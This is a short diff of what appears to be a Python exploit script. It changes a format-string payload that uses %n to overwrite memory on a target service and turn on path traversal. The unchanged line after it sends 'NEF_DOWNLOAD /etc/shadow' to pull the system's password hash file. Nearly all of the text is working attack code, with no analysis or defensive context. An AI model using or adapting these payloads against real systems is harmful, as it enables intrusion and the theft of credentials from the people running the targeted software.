@@ -18,7 +18,7 @@ def send_cmd(payload, recv_after=True):
         s.close()
 
 if __name__ == '__main__':
-    enable_path_traversal = "%lu%lu%lu%lu%lu%230x%n\n"
+    enable_path_traversal = "%.08X%.08X%.08X%.08X%.08X%197x%n\n"
     get_passwd_file = "NEF_DOWNLOAD /etc/shadow\n"
 
 
